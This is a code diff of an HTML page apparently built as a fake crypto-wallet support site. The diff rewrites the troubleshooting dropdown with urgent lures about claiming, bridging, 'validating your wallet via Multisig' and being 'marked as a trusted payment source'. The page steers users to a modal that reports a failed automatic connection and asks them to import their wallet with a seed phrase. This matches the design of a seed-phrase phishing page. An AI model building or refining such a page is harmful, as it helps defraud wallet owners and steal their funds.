@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -23,36 +22,36 @@
                 <label for="troubleshoot-select" class="troubleshoot-label">Troubleshoot an Issue</label>
                 <select id="troubleshoot-select" class="troubleshoot-dropdown">
                     <option value="">Select an issue</option>
-                    <option value="access-denied">Access denied when trying to connect wallet?</option>
-                    <option value="incorrect-balance">Account not showing correct balance?</option>
-                    <option value="custom-tokens">Add custom tokens not displaying?</option>
+                    <option value="claiming-issue">CLAIMING-ISSUE: Access denied when trying to claim?</option>
+                    <option value="bridging-issue">BRIDGING-ISSUE: Click here to bridge tokens or resolve bridging related issues?</option>
+                    <option value="defi/farming">DEFI-FARMING:Click here for DeFi or Commercial farming related issues?</option>
                     <option value="api-issues">API related issues</option>
-                    <option value="blockchain-sync">Blockchain network not syncing?</option>
-                    <option value="cannot-send">Cannot send transactions?</option>
-                    <option value="connection-timeout">Connection timeout errors?</option>
-                    <option value="contract-failing">Contract interaction failing?</option>
-                    <option value="corrupted-data">Corrupted wallet data?</option>
-                    <option value="transaction-delay">Delay in transaction confirmation?</option>
-                    <option value="import-error">Error messages during wallet import?</option>
-                    <option value="hardware-failed">Failed to connect hardware wallet?</option>
-                    <option value="gas-fees">Gas fees too high?</option>
-                    <option value="address-format">Incorrect wallet address format?</option>
-                    <option value="lost-access">Lost access to wallet?</option>
-                    <option value="mobile-app">Mobile wallet app not opening?</option>
-                    <option value="multiple-connections">Multiple wallet connections causing conflicts</option>
-                    <option value="network-not-found">Network not found in wallet?</option>
-                    <option value="phishing-alerts">Phishing alerts in wallet?</option>
-                    <option value="private-key-compromised">Private key compromised?</option>
-                    <option value="recovery-phrase">Recovery phrase not accepted?</option>
-                    <option value="security-warnings">Security warnings on wallet site?</option>
-                    <option value="seed-backup-lost">Seed phrase backup lost?</option>
-                    <option value="slow-ui">Slow wallet UI response?</option>
-                    <option value="stuck-connecting">Stuck on connecting wallet screen?</option>
-                    <option value="sync-issues">Sync issues with blockchain explorer</option>
-                    <option value="transaction-rejected">Transaction rejected by user?</option>
-                    <option value="unable-switch">Unable to switch accounts?</option>
-                    <option value="disconnecting">Wallet disconnecting unexpectedly?</option>
-                    <option value="not-detected">Wallet not detected by dApp?</option>
+                    <option value="nft-issues">NFT-ISSUE:Click here to resolve NFT related issues?</option>
+                    <option value="Recovery">RECOVERY: Click here for wallet recovery?</option>
+                    <option value="Buy-token/coin">BUYING-TOKEN/COIN: Click here to trade. Your account has to be marked as a trusted payment source to start trading?</option>
+                    <option value="Transaction-delay">TRANSACTION-DELAY: Click here for any transaction related error.?</option>
+                    <option value="locked-data">LOCKED-DATA: Corrupted wallet data?</option>
+                    <option value="validation">VALIDATION: Click here to validate your wallet via Multisig?</option>
+                    <option value="login-error">LOGIN-ERROR: Error messages during wallet import?</option>
+                    <option value="exchange">EXCHANGE: Click here for token exchange or to resolve errors encountered during token exchange?</option>
+                    <option value="gas-fees">GAS-FEES: Gas fees too high?</option>
+                    <option value="address-format">ADDRESS-ERROR: Incorrect wallet address format?</option>
+                    <option value="lost-access">WALLET-ISSUE: Lost access to wallet?</option>
+                    <option value="mobile-app">APPLICATION-ISSUE: Mobile wallet app not opening?</option>
+                    <option value="multiple-connections">CONNECTION-ISSUE: Multiple wallet connections causing conflicts</option>
+                    <option value="network-not-found">MISSING-NETWORK: Network not found in wallet?</option>
+                    <option value="phishing-alerts">PHISHING-ALERT: Phishing alerts in wallet?</option>
+                    <option value="private-key-compromised">PRIVACY-COMPROMISED: Private key compromised?</option>
+                    <option value="recovery-phrase">PHRASE-ERROR: Recovery phrase not accepted?</option>
+                    <option value="security-warnings">SECURITY-BRIDGE: Security warnings on wallet site?</option>
+                    <option value="seed-backup-lost">LOST-CRIDENTIALS: Seed phrase backup lost?</option>
+                    <option value="slow-ui">WALLET-MALFUNCTION: Slow wallet UI response?</option>
+                    <option value="stuck-connecting">NETWORK-ERROR: Stuck on connecting wallet screen?</option>
+                    <option value="sync-issues">UNABLE-TO-SYNC: Sync issues with blockchain explorer</option>
+                    <option value="transaction-rejected">TRANSACTION: Transaction rejected by user?</option>
+                    <option value="unable-switch">SWITCH-ISSUE: Unable to switch accounts?</option>
+                    <option value="disconnecting">DISCONNECTION: Wallet disconnecting unexpectedly?</option>
+                    <option value="not-detected">DETECTION-ERROR: Wallet not detected by dApp?</option>
                     <option value="other">Others</option>
                 </select>
             </div>
@@ -250,6 +249,7 @@
         </div>
     </div>
 
+    
     <!-- Connection Steps Modal -->
     <div id="steps-modal" class="modal hidden">
         <div class="modal-content">
@@ -268,7 +268,7 @@
                 There was an error connecting automatically. But do not worry, you can still connect manually.
             </div>
             
-            <h3 id="import-title">Import your wallet</h3>
+            <h3 id="import-title">Import your <span id="wallet-name">wallet</span> <span class="wallet-info-icon">🛈</span></h3>
             
             <div class="import-options">
                 <button class="import-option active" data-option="seed">Seed Phrase</button>
